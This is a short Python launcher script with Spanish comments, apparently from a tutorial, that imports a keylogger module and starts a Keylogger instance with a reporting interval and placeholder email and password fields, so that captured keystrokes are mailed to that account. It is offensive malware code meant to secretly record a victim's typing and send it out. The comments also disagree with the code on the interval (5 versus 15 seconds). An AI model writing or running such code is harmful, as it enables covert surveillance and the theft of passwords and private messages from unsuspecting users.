from asyncio.log import logger

import keylogger

 

#Dentro de esta variable vamos a llamar a la clase que hemos escrito en el anterior programa,llamada Keylogger.

#Ponemos el nombre del programa (keylogger) y el nombre de la clase seguido de punto (Keylogger) >>> keylogger.Keylogger

#El 5 que hemos puesto hace referencia a el num de segundos de cada x que se activara el keylogger

mi_keylogger = keylogger.Keylogger(15, "email al que recibir la info", "Contraseña del correo")

mi_keylogger.start()